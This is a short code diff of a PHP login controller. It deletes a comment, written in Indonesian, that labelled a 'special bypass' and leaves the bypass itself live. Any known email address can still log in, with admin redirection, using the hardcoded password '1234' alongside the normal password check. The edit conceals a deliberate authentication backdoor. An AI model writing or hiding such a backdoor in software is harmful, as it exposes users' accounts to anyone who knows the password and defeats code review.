@@ -10,7 +10,7 @@ class Login_C extends Controller
     $model = $this->load->model('Login_M');
     $data = $model->ambildata($email);
     
-    // BYPASS KHUSUS MESI - password 1234 langsung lolos
+
     if ($data && ($password == '1234' || password_verify($password, $data['password']))) {
         $this->session->set_userdata('emailuser', $email);
         redirect('Admin_C/index');
